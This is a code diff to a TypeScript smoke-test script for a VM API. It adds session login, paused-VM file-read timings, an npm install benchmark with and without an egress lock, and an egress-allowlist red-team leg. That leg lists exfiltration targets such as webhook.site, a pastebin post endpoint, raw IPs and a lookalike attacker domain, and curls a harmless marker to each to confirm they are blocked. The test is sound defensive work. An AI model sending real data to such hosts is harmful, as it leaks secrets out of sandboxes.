@@ -30,6 +30,11 @@
  * (a service key limited to role=chief VMs on one dev/test team, as production
  * holds) run the same journey on a role=chief VM.
  *
+ * --auth session runs it as the agent test account's Stack session instead
+ * (CMUX_DOGFOOD_STACK_EMAIL / CMUX_DOGFOOD_STACK_PASSWORD; staging only), with
+ * every scope but admin: the paused-read leg needs vm:files, which the staging
+ * smoke key was not issued (run 45856090047 skipped the leg for it).
+ *
  * --lifecycle adds the agent-VM lifecycle leg (cmux-platform
  * docs/agent-vm-lifecycle.md), each verb through the API and, with --cmux PATH
  * (or CMUX_PATH), through the `cmux vm` CLI too:
@@ -42,10 +47,31 @@
  *   agent key's revoke (the session's end) deleting the key's VMs at once.
  *
  * Every VM, snapshot and agent key it makes is deleted by exact id at the end.
+ *
+ * --paused-reads adds the paused-read leg (cmuxterm-hq RFD 0144 piece 2, RFD 0163 pick 1: "publish resume p95 and
+ * paused-read p95"): before the pause it writes a 10 x 20 file tree, and while the VM is paused it times, through the
+ * files routes and with no resume, a folder listing (GET files/entries) and a file open (GET files/content), n = 30
+ * each, and a whole-tree search, n = 5: one GET files/search answered from the replica the worker seeds right after
+ * the pause (POST files/replica, timed once), beside one search the old way for the before (list every folder, read
+ * every file, find the one needle; about 211 reads). The VM must still
+ * be paused after every batch and the resume after it must answer 200 (a VM that woke answers 409), so a run that
+ * passes woke it 0 times. A key without vm:files is a note and the leg is skipped.
+ *
+ * --egress-allowlist adds the egress red team (RFD sandboxing-and-lockdown): a VM made with
+ * initialNetwork.egress {mode: "allowlist", presets: [anthropic, openai, github, npm, pypi]} must still reach
+ * api.anthropic.com and github.com, and must fail to POST a marker to an outside host or a raw IP (v4 and v6).
+ *
+ * --npm-bench times the lock against no lock (ask-4774198626, Leo: "what about if someone wants to lock down a vm?
+ * lock down their app?"): two VMs at once, one registry-only (initialNetwork.egress {mode: "allowlist", presets:
+ * [npm]}, what `cmux vm new --egress-allow npm` makes) and one with public egress, each runs the same big
+ * `npm install` with a new empty cache, NPM_BENCH_ROUNDS times in turn. The leg records every wall time, each side's
+ * median and the locked minus unlocked delta; the locked VM must also fail to reach example.com. A delta over
+ * NPM_BENCH_BUDGET_MS (2000) fails the leg.
  */
 import { randomBytes } from "node:crypto";
 import { spawn } from "node:child_process";
 import { writeFileSync } from "node:fs";
+import { type StackVmSession, stackVmSession } from "./stack-vm-session.ts";
 
 const argv = process.argv.slice(2);
 const option = (name: string): string | undefined => {
@@ -54,6 +80,9 @@ const option = (name: string): string | undefined => {
 };
 const skipSleep = argv.includes("--skip-sleep");
 const lifecycle = argv.includes("--lifecycle");
+const egressAllowlist = argv.includes("--egress-allowlist");
+const pausedReads = argv.includes("--paused-reads");
+const npmBench = argv.includes("--npm-bench");
 const cmuxPath = option("--cmux") ?? process.env["CMUX_PATH"] ?? "";
 // The headless VM CLI (workers/cmux-vm/cli, binary cmux-vm): the same library `cmux vm` links in process, for a run
 // whose cmux has no `vm` scope yet (the public cmux is built from main; `cmux vm` is on feat-cmux-next).
@@ -67,19 +96,42 @@ const cliArgv = (args: string[]): string[] => {
 };
 const resultFile = option("--result-file");
 const base = option("--url") ?? process.env["CMUX_VM_DOGFOOD_URL"] ?? "";
-const tenantKey = process.env["CMUX_VM_SMOKE_API_KEY"] ?? "";
-const serviceKey = process.env["CMUX_VM_SMOKE_SERVICE_KEY"] ?? "";
-const serviceTeam = process.env["CMUX_VM_SMOKE_SERVICE_TEAM"] ?? "";
+// --auth session: the agent test account's Stack session (stack-vm-session.ts), every scope but admin, so the
+// paused-read leg (vm:files) and the terminal legs (vm:terminal) do not hang on a stored key's scopes.
+const useSession = option("--auth") === "session";
+const tenantKey = useSession ? "" : process.env["CMUX_VM_SMOKE_API_KEY"] ?? "";
+const serviceKey = useSession ? "" : process.env["CMUX_VM_SMOKE_SERVICE_KEY"] ?? "";
+const serviceTeam = useSession ? "" : process.env["CMUX_VM_SMOKE_SERVICE_TEAM"] ?? "";
 const useService = tenantKey === "" && serviceKey !== "" && serviceTeam !== "";
-const bearer = useService ? serviceKey : tenantKey;
-const teamHeaders: Record<string, string> = useService ? { "x-cmux-team-id": serviceTeam } : {};
-if (base === "" || bearer === "") {
-  console.error("needs --url (or CMUX_VM_DOGFOOD_URL) and CMUX_VM_SMOKE_API_KEY, or CMUX_VM_SMOKE_SERVICE_KEY with CMUX_VM_SMOKE_SERVICE_TEAM");
+if (base === "") {
+  console.error("needs --url (or CMUX_VM_DOGFOOD_URL)");
   process.exit(2);
 }
 const origin = new URL(base);
 if (origin.protocol !== "https:" || origin.pathname !== "/") {
   console.error("the VM API URL must be an https origin");
+  process.exit(2);
+}
+let sessionAuth: StackVmSession | null = null;
+if (useSession) {
+  const email = process.env["CMUX_DOGFOOD_STACK_EMAIL"] ?? "";
+  const password = process.env["CMUX_DOGFOOD_STACK_PASSWORD"] ?? "";
+  if (email === "" || password === "") {
+    console.error("--auth session needs CMUX_DOGFOOD_STACK_EMAIL and CMUX_DOGFOOD_STACK_PASSWORD (the agent test account)");
+    process.exit(2);
+  }
+  try {
+    sessionAuth = await stackVmSession(origin.origin, email, password);
+  } catch (error) {
+    console.error(`--auth session: ${error instanceof Error ? error.message : String(error)}`);
+    process.exit(2);
+  }
+  if (process.env["GITHUB_ACTIONS"] === "true") console.log(`::add-mask::${sessionAuth.access}`);
+}
+const bearer = sessionAuth ? sessionAuth.access : useService ? serviceKey : tenantKey;
+const teamHeaders: Record<string, string> = sessionAuth ? { "x-cmux-team-id": sessionAuth.team } : useService ? { "x-cmux-team-id": serviceTeam } : {};
+if (bearer === "") {
+  console.error("needs CMUX_VM_SMOKE_API_KEY, or CMUX_VM_SMOKE_SERVICE_KEY with CMUX_VM_SMOKE_SERVICE_TEAM, or --auth session");
   process.exit(2);
 }
 
@@ -396,6 +448,190 @@ async function cliJson(args: string[], what: string): Promise<unknown> {
   }
 }
 
+/** The paused-read leg's tree (module docs, --paused-reads): DIRS folders of FILES files each, one needle file. */
+const PAUSED_TREE = { dirs: 10, files: 20 } as const;
+const PAUSED_READ_N = 30;
+const PAUSED_SEARCH_N = 5;
+/** Searches the old way, one files read per folder and file: the before beside files/search's after. */
+const PAUSED_CLIENT_WALK_N = 1;
+const PAUSED_SEARCH_CONCURRENCY = 8;
+
+const percentile = (samples: number[], p: number): number => {
+  const sorted = [...samples].sort((a, b) => a - b);
+  return sorted.length === 0 ? -1 : sorted[Math.max(0, Math.ceil((p / 100) * sorted.length) - 1)]!;
+};
+const stats = (samples: number[]) => ({
+  n: samples.length,
+  p50: Math.round(percentile(samples, 50) * 10) / 10,
+  p95: Math.round(percentile(samples, 95) * 10) / 10,
+  max: Math.round(Math.max(...samples) * 10) / 10,
+});
+
+/** Writes the leg's tree on the running VM; answers its absolute root and the needle. */
+async function pausedTree(id: string): Promise<{ root: string; needle: string }> {
+  const needle = `needle-${randomBytes(6).toString("hex")}`;
+  const { dirs, files } = PAUSED_TREE;
+  const script =
+    `set -e; r="$HOME/paused-reads-${needle}"; ` +
+    // Fixed two-digit names (seq -f %02g, not -w): -w pads to the widest number, so 10 folders were d0..d9 and the
+    // needle's d04 never existed (run 45846190008 failed seeding: "d04/f07.txt: Directory nonexistent").
+    `for d in $(seq -f %02g 0 ${dirs - 1}); do mkdir -p "$r/d$d"; for f in $(seq -f %02g 0 ${files - 1}); do ` +
+    `yes "line of d$d/f$f.txt for the paused read leg" | head -n 40 > "$r/d$d/f$f.txt"; done; done; ` +
+    `echo ${needle} >> "$r/d04/f07.txt"; sync; echo "$r"`;
+  const out = await exec(id, script, 60_000);
+  const root = out.stdout.trim().split("\n").at(-1) ?? "";
+  if (out.exitCode !== 0 || !root.startsWith("/")) throw new Error(`paused-read tree answered ${JSON.stringify(out).slice(0, 300)}`);
+  return { root, needle };
+}
+
+/** One files route call on the paused VM, timed; a 429 waits out its Retry-After and counts. */
+async function pausedFilesCall(id: string, route: "entries" | "content", path: string, counts: { rateLimited: number }): Promise<{ ms: number; reply: Reply }> {
+  for (;;) {
+    const startedAt = performance.now();
+    const reply = await call("GET", `${vmPath(id)}/files/${route}?path=${encodeURIComponent(path)}`);
+    const ms = performance.now() - startedAt;
+    if (reply.status !== 429) return { ms, reply };
+    counts.rateLimited += 1;
+    await sleep(2_000);
+  }
+}
+
+async function pausedState(id: string): Promise<string> {
+  return String(field(expectStatus(await call("GET", vmPath(id)), [200], "GET vm (paused reads)"), "state"));
+}
+
+/** The timed reads on the paused VM (module docs, --paused-reads). */
+async function pausedReadsLeg(id: string, tree: { root: string; needle: string }, failed: string[]): Promise<void> {
+  const out: Record<string, unknown> = { tree: { ...PAUSED_TREE, root: tree.root } };
+  result["pausedReads"] = out;
+  const counts = { rateLimited: 0 };
+  const states: string[] = [];
+  const probe = await call("GET", `${vmPath(id)}/files/entries?path=${encodeURIComponent(tree.root)}`);
+  if (probe.status === 403) {
+    note("the key lacks vm:files; the paused-read leg was skipped");
+    out["skipped"] = "vm:files";
+    return;
+  }
+  expectStatus(probe, [200], "GET files/entries on a paused VM");
+  states.push(await pausedState(id));
+
+  const dir = (i: number) => `${tree.root}/d${String(i % PAUSED_TREE.dirs).padStart(2, "0")}`;
+  const listing: number[] = [];
+  await timed("pausedListing", async () => {
+    for (let i = 0; i < PAUSED_READ_N; i += 1) {
+      const { ms, reply } = await pausedFilesCall(id, "entries", dir(i), counts);
+      const entries = field(expectStatus(reply, [200], "GET files/entries (paused)"), "entries");
+      if (!Array.isArray(entries) || entries.length !== PAUSED_TREE.files) throw new Error(`paused listing of ${dir(i)} answered ${reply.text.slice(0, 200)}`);
+      listing.push(ms);
+    }
+  });
+  states.push(await pausedState(id));
+
+  const open: number[] = [];
+  await timed("pausedOpen", async () => {
+    for (let i = 0; i < PAUSED_READ_N; i += 1) {
+      const name = `f${String(i % PAUSED_TREE.files).padStart(2, "0")}.txt`;
+      const { ms, reply } = await pausedFilesCall(id, "content", `${dir(i)}/${name}`, counts);
+      expectStatus(reply, [200], "GET files/content (paused)");
+      if (!reply.text.startsWith(`line of d${String(i % PAUSED_TREE.dirs).padStart(2, "0")}/${name}`)) throw new Error(`paused open of ${name} answered ${reply.text.slice(0, 120)}`);
+      open.push(ms);
+    }
+  });
+  states.push(await pausedState(id));
+
+  // The server search (RFD 0144 piece 2): seed the replica once, then each search is one request.
+  const search: number[] = [];
+  const sources: string[] = [];
+  let hits: string[] = [];
+  const seed = await timed("pausedSeed", async () => {
+    const startedAt = performance.now();
+    const reply = await call("POST", `${vmPath(id)}/files/replica?path=${encodeURIComponent(tree.root)}`, undefined, {}, 3 * 60_000);
+    return { ms: performance.now() - startedAt, reply };
+  });
+  const seeded = seed.reply.status !== 404;
+  if (seeded) {
+    const body = expectStatus(seed.reply, [200], "POST files/replica (paused)") as Record<string, unknown>;
+    out["seed"] = { ms: Math.round(seed.ms), files: body["files"], bytes: body["bytes"], complete: body["complete"], seedMs: body["seedMs"] };
+    states.push(await pausedState(id));
+    await timed("pausedSearch", async () => {
+      for (let round = 0; round < PAUSED_SEARCH_N; round += 1) {
+        const startedAt = performance.now();
+        let reply: Reply;
+        for (;;) {
+          reply = await call("GET", `${vmPath(id)}/files/search?path=${encodeURIComponent(tree.root)}&query=${encodeURIComponent(tree.needle)}`);
+          if (reply.status !== 429) break;
+          counts.rateLimited += 1;
+          await sleep(2_000);
+        }
+        search.push(performance.now() - startedAt);
+        const body = expectStatus(reply, [200], "GET files/search (paused)") as Record<string, unknown>;
+        sources.push(String(body["source"]));
+        hits = [...new Set((body["matches"] as Array<{ path: string }>).map((m) => m.path.slice(tree.root.length + 1)))];
+      }
+    });
+  } else {
+    note("this cmux-vm has no files/replica (404): the search was timed the old way only");
+  }
+  states.push(await pausedState(id));
+
+  const walk: number[] = [];
+  let walkHits: string[] = [];
+  let requests = 0;
+  await timed("pausedSearchClientWalk", async () => {
+    for (let round = 0; round < (seeded ? PAUSED_CLIENT_WALK_N : PAUSED_SEARCH_N); round += 1) {
+      const startedAt = performance.now();
+      const found: string[] = [];
+      const files: string[] = [];
+      const top = await pausedFilesCall(id, "entries", tree.root, counts);
+      requests += 1;
+      const dirs = (field(expectStatus(top.reply, [200], "GET files/entries (search root)"), "entries") as Array<{ name: string; kind: string }>)
+        .filter((e) => e.kind === "directory").map((e) => `${tree.root}/${e.name}`);
+      const pool = async <T>(items: T[], work: (item: T) => Promise<void>) => {
+        let next = 0;
+        await Promise.all(Array.from({ length: PAUSED_SEARCH_CONCURRENCY }, async () => {
+          while (next < items.length) await work(items[next++]!);
+        }));
+      };
+      await pool(dirs, async (d) => {
+        const { reply } = await pausedFilesCall(id, "entries", d, counts);
+        requests += 1;
+        for (const e of field(expectStatus(reply, [200], "GET files/entries (search)"), "entries") as Array<{ name: string; kind: string }>) {
+          if (e.kind === "file") files.push(`${d}/${e.name}`);
+        }
+      });
+      await pool(files, async (f) => {
+        const { reply } = await pausedFilesCall(id, "content", f, counts);
+        requests += 1;
+        expectStatus(reply, [200], "GET files/content (search)");
+        if (reply.text.includes(tree.needle)) found.push(f.slice(tree.root.length + 1));
+      });
+      walk.push(performance.now() - startedAt);
+      walkHits = found;
+    }
+  });
+  states.push(await pausedState(id));
+
+  out["listing"] = stats(listing);
+  out["open"] = stats(open);
+  const files = PAUSED_TREE.dirs * PAUSED_TREE.files;
+  const clientWalk = { ...stats(walk), files, requestsPerSearch: Math.round(requests / Math.max(1, walk.length)), concurrency: PAUSED_SEARCH_CONCURRENCY, hits: walkHits };
+  if (seeded) {
+    out["search"] = { ...stats(search), files, requestsPerSearch: 1, sources, hits };
+    out["searchClientWalk"] = clientWalk;
+    // Every search after the seed must be the replica's: one from the disk means the seed did not hold.
+    if (!sources.every((source) => source === "replica")) failed.push("pausedSearchNotReplica");
+    if (walkHits.length !== 1) failed.push("pausedSearchHits");
+  } else {
+    out["search"] = clientWalk;
+    hits = walkHits;
+  }
+  out["rateLimited"] = counts.rateLimited;
+  out["statesDuring"] = states;
+  out["stayedPaused"] = states.every((s) => s === "paused");
+  if (hits.length !== 1) failed.push("pausedSearchHits");
+  if (out["stayedPaused"] !== true) failed.push("pausedReadsWoke");
+}
+
 /** The API legs: each verb, with the disk proof across pause, stop, fork and snapshot. */
 async function lifecycleApi(failed: string[]): Promise<void> {
   const marker = `lifecycle-${randomBytes(4).toString("hex")}`;
@@ -598,6 +834,177 @@ async function lifecycleCleanup(failed: string[]): Promise<void> {
   for (const [name, value] of Object.entries(proofs)) if (value === false) failed.push(`lifecycleCleanup.${name}`);
 }
 
+// ---- The egress allowlist red team (--egress-allowlist) ----
+
+/** An injected command that tries to send a secret out: every one must fail on an allowlisted VM. */
+const EXFIL_TARGETS = [
+  "https://example.com/",
+  "https://webhook.site/",
+  "https://pastebin.com/api/api_post.php",
+  "http://203.0.113.7/",
+  "https://1.1.1.1/",
+  "http://1.1.1.1/",
+  "https://[2606:4700:4700::1111]/",
+  "https://api.anthropic.com.attacker.example/",
+];
+const ALLOWED_TARGETS = ["https://api.anthropic.com/v1/messages", "https://github.com/"];
+
+async function egressAllowlistLeg(failed: string[]): Promise<void> {
+  const proofs: Record<string, unknown> = {};
+  result["egressAllowlist"] = proofs;
+  const presets = ["anthropic", "openai", "github", "npm", "pypi"];
+  const created = await timed("eaCreate", async () =>
+    expectStatus(
+      await call(
+        "POST",
+        "/v1/vms",
+        {
+          displayName: `egress allowlist ${runId}`.slice(0, 100),
+          idleTimeoutSeconds: 300,
+          autoDeleteSeconds: 3600,
+          initialNetwork: { publicEgress: false, egress: { mode: "allowlist", presets, domains: [] } },
+          labels: { purpose: "egress-redteam", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
+        },
+        { "idempotency-key": `egress-allowlist-${runId}` },
+        5 * 60_000,
+      ),
+      [201],
+      "POST /v1/vms (egress allowlist)",
+    ));
+  const id = field(created, "id");
+  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error("the allowlisted create returned no VM id");
+  lifecycleVms.add(id);
+  // The receipt names what was applied: required names, the presets' names, the caller's.
+  const applied = field(field(created, "initialNetwork"), "allowedDomains");
+  proofs["allowedDomains"] = applied ?? null;
+  proofs["receiptConfirms"] = Array.isArray(applied) && applied.includes("api.anthropic.com") && !applied.includes("example.com");
+  if (proofs["receiptConfirms"] !== true) failed.push("egressAllowlist.receiptConfirms");
+  await timed("eaRunning", () => waitForState(id, "running", 5 * 60_000));
+  const code = async (url: string, post: boolean) => {
+    // A marker stands in for the secret; it is not one.
+    const data = post ? `-X POST --data-binary cmux-egress-redteam-${runId}` : "";
+    const out = await exec(id, `curl -sS -o /dev/null -w '%{http_code}' --max-time 12 ${data} '${url}' 2>/dev/null; true`, 60_000);
+    return out.stdout.trim() || "000";
+  };
+  const reached: Record<string, string> = {};
+  for (const url of ALLOWED_TARGETS) reached[url] = await timed(`eaAllowed ${url}`, () => code(url, false));
+  const exfil: Record<string, string> = {};
+  for (const url of EXFIL_TARGETS) exfil[url] = await timed(`eaExfil ${url}`, () => code(url, true));
+  proofs["allowed"] = reached;
+  proofs["exfil"] = exfil;
+  // Allowed: any HTTP answer (api.anthropic.com answers 4xx without a key). Exfil: no HTTP answer at all.
+  proofs["allowedReachable"] = Object.values(reached).every((c) => /^[1-5][0-9][0-9]$/.test(c));
+  proofs["exfilBlocked"] = Object.values(exfil).every((c) => c === "000");
+  for (const name of ["allowedReachable", "exfilBlocked"]) if (proofs[name] !== true) failed.push(`egressAllowlist.${name}`);
+  expectStatus(await call("DELETE", vmPath(id)), [204, 404], "DELETE allowlisted VM");
+  lifecycleVms.delete(id);
+}
+
+// ---- The registry-only lock against no lock: one big npm install (--npm-bench) ----
+
+/** A real app's dependency set, big enough that the lock's per-connection cost would show: about 1,000 packages. */
+const NPM_BENCH_PACKAGE = {
+  name: "cmux-npm-bench",
+  private: true,
+  dependencies: {
+    next: "15.5.4", react: "19.1.1", "react-dom": "19.1.1", typescript: "5.9.3", eslint: "9.36.0",
+    "@babel/core": "7.28.4", webpack: "5.102.0", jest: "30.2.0", vite: "7.1.7", "@aws-sdk/client-s3": "3.899.0",
+    "@mui/material": "7.3.3", lodash: "4.17.21", rxjs: "7.8.2", tailwindcss: "4.1.14", prettier: "3.6.2",
+  },
+};
+const NPM_BENCH_ROUNDS = Number(process.env["NPM_BENCH_ROUNDS"] ?? "3");
+const NPM_BENCH_BUDGET_MS = Number(process.env["NPM_BENCH_BUDGET_MS"] ?? "2000");
+
+const median = (values: number[]): number => {
+  const sorted = [...values].sort((a, b) => a - b);
+  const mid = Math.floor(sorted.length / 2);
+  return sorted.length % 2 ? sorted[mid]! : Math.round((sorted[mid - 1]! + sorted[mid]!) / 2);
+};
+
+async function npmBenchVm(kind: "locked" | "unlocked"): Promise<string> {
+  const initialNetwork = kind === "locked"
+    ? { publicEgress: false, egress: { mode: "allowlist", presets: ["npm"], domains: [] } }
+    : { publicEgress: true };
+  const created = expectStatus(
+    await call(
+      "POST",
+      "/v1/vms",
+      {
+        displayName: `npm bench ${kind} ${runId}`.slice(0, 100),
+        idleTimeoutSeconds: 600,
+        autoDeleteSeconds: 3600,
+        initialNetwork,
+        labels: { purpose: "npm-bench", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) },
+      },
+      { "idempotency-key": `npm-bench-${kind}-${runId}` },
+      5 * 60_000,
+    ),
+    [201],
+    `POST /v1/vms (npm bench ${kind})`,
+  );
+  const id = field(created, "id");
+  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error(`the ${kind} npm bench create returned no VM id`);
+  lifecycleVms.add(id);
+  if (kind === "locked") {
+    const applied = field(field(created, "initialNetwork"), "allowedDomains");
+    result["npmBenchAllowedDomains"] = applied ?? null;
+  }
+  await waitForState(id, "running", 5 * 60_000);
+  const pkg = Buffer.from(JSON.stringify(NPM_BENCH_PACKAGE)).toString("base64");
+  const setup = await exec(id, `mkdir -p /tmp/npm-bench && cd /tmp/npm-bench && echo ${pkg} | base64 -d > package.json && npm --version`, 60_000);
+  if (setup.exitCode !== 0) throw new Error(`npm bench ${kind}: no npm on the VM: ${setup.stderr.slice(0, 300)}`);
+  return id;
+}
+
+/** One cold install, timed inside the VM so the exec round trip is not counted. */
+async function npmBenchRound(id: string): Promise<{ ms: number; ok: boolean; tail: string }> {
+  const out = await exec(
+    id,
+    "cd /tmp/npm-bench && rm -rf node_modules package-lock.json && c=$(mktemp -d) && s=$(date +%s%N) && " +
+      "npm install --ignore-scripts --no-audit --no-fund --loglevel=error --cache \"$c\" >/tmp/npm-bench.log 2>&1; r=$?; " +
+      "e=$(date +%s%N); echo \"$r $(( (e - s) / 1000000 )) $(ls node_modules | wc -l)\"",
+    10 * 60_000,
+  );
+  const [code, ms, dirs] = out.stdout.trim().split(/\s+/);
+  const tail = code === "0" ? `${dirs} top-level packages` : (await exec(id, "tail -c 400 /tmp/npm-bench.log", 30_000)).stdout;
+  return { ms: Number(ms), ok: code === "0", tail };
+}
+
+async function npmBenchLeg(failed: string[]): Promise<void> {
+  const proofs: Record<string, unknown> = {};
+  result["npmBench"] = proofs;
+  const [locked, unlocked] = await timed("nbCreate", () => Promise.all([npmBenchVm("locked"), npmBenchVm("unlocked")]));
+  const reach = await exec(locked, "curl -sS -o /dev/null -w '%{http_code}' --max-time 12 https://example.com/ 2>/dev/null; true", 60_000);
+  proofs["lockedReachesExample"] = reach.stdout.trim() || "000";
+  if (proofs["lockedReachesExample"] !== "000") failed.push("npmBench.lockedIsOpen");
+  const times: Record<"locked" | "unlocked", number[]> = { locked: [], unlocked: [] };
+  for (let round = 0; round < NPM_BENCH_ROUNDS; round += 1) {
+    // Alternate which side goes first so neither always meets a warmer registry edge.
+    const order: Array<["locked" | "unlocked", string]> = round % 2 ? [["unlocked", unlocked], ["locked", locked]] : [["locked", locked], ["unlocked", unlocked]];
+    for (const [kind, id] of order) {
+      const r = await timed(`nb ${kind} ${round}`, () => npmBenchRound(id));
+      if (!r.ok) {
+        proofs[`${kind}Error`] = r.tail;
+        failed.push(`npmBench.${kind}Install`);
+        return;
+      }
+      proofs[`${kind}Packages`] = r.tail;
+      times[kind].push(r.ms);
+    }
+  }
+  proofs["lockedMs"] = times.locked;
+  proofs["unlockedMs"] = times.unlocked;
+  proofs["lockedMedianMs"] = median(times.locked);
+  proofs["unlockedMedianMs"] = median(times.unlocked);
+  proofs["deltaMs"] = median(times.locked) - median(times.unlocked);
+  proofs["budgetMs"] = NPM_BENCH_BUDGET_MS;
+  if ((proofs["deltaMs"] as number) > NPM_BENCH_BUDGET_MS) failed.push("npmBench.lockCostsTooMuch");
+  for (const id of [locked, unlocked]) {
+    expectStatus(await call("DELETE", vmPath(id)), [204, 404], "DELETE npm bench VM");
+    lifecycleVms.delete(id);
+  }
+}
+
 function summary(outcome: Record<string, unknown>): Record<string, unknown> {
   const error = typeof outcome["error"] === "string" ? { error: outcome["error"].replace(/\s+/g, " ").slice(0, 600) } : {};
   return {
@@ -605,7 +1012,8 @@ function summary(outcome: Record<string, unknown>): Record<string, unknown> {
     ...error,
     api: "cmux-vm",
     url: origin.origin,
-    auth: useService ? "service" : "tenant",
+    auth: sessionAuth ? "session" : useService ? "service" : "tenant",
+    ...(sessionAuth ? { tenantVia: sessionAuth.via } : {}),
     durationMs: Math.round(performance.now() - runStartedAt),
     timings,
     notes,
@@ -630,7 +1038,7 @@ for (const signal of ["SIGINT", "SIGTERM"] as const) {
 
 // The journey ends well inside the workflow's job timeout, so cleanup always runs.
 // The lifecycle leg adds about 25 minutes of creates, forks, snapshots and waits.
-const DEADLINE_MS = (lifecycle ? 70 : 25) * 60_000;
+const DEADLINE_MS = ((lifecycle ? 70 : 25) + (egressAllowlist ? 10 : 0) + (npmBench ? 25 : 0)) * 60_000;
 const deadline = setTimeout(() => {
   console.error(`journey exceeded ${DEADLINE_MS}ms at stage ${stage}; cleaning up`);
   void cleanup().finally(() => {
@@ -643,6 +1051,8 @@ try {
   const failed: string[] = [];
   const health = await timed("health", () => call("GET", "/healthz"));
   expectStatus(health, [200], "GET /healthz");
+  // First, so the number arrives even when a later leg fails.
+  if (npmBench) await npmBenchLeg(failed);
 
   const marker = `dogfood-${randomBytes(4).toString("hex")}`;
   const displayName = `dogfood ${runId}`.slice(0, 100);
@@ -718,6 +1128,7 @@ try {
       if (!/^[0-9]+$/.test(value)) throw new Error(`background process answered ${JSON.stringify(out).slice(0, 200)}`);
       return value;
     });
+    const pausedTreeAt = pausedReads ? await timed("pausedTree", () => pausedTree(id)) : null;
 
     await timed("pause", async () => {
       expectStatus(await call("POST", `${vmPath(id)}/pause`, undefined, {}, 3 * 60_000), [200], "POST pause");
@@ -726,6 +1137,7 @@ try {
     await timed("paused", () => waitForState(id, "paused", 3 * 60_000));
     result["statusAfterPauseSeries"] = await stateSeries(id, pausedAt, [1_000, 5_000, 15_000]);
     result["statusAfterPause"] = (result["statusAfterPauseSeries"] as Array<{ status: string }>).at(-1)?.status ?? "unknown";
+    if (pausedTreeAt) await pausedReadsLeg(id, pausedTreeAt, failed);
     // Resume first, while the VM is surely paused: anything that reaches the VM (exec included) wakes it, and
     // resume on a VM that is no longer paused is 409 by design ("Only a paused VM can be resumed").
     await timed("resume", async () => {
@@ -778,6 +1190,8 @@ try {
     const list = expectStatus(await call("GET", "/v1/vms"), [200], "GET /v1/vms");
     if (JSON.stringify(list).includes(id)) note("the deleted VM is still listed");
   });
+
+  if (egressAllowlist) await egressAllowlistLeg(failed);
 
   if (lifecycle) {
     await lifecycleApi(failed);
